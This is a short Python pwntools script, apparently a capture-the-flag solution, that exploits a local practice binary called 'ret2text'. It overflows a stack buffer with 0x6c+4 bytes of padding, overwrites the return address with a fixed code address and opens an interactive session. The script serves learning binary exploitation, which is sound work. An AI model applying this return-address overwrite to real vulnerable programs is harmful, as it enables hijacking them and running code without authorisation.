#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

payload = fit({0x6c + 0x4: p32(0x804863A)})
#  payload = flat(['a' * (0x6c + 0x4), 0x804863A])
io = process("../ret2text")
io.sendlineafter("anything?", payload)
io.interactive()
io.close()
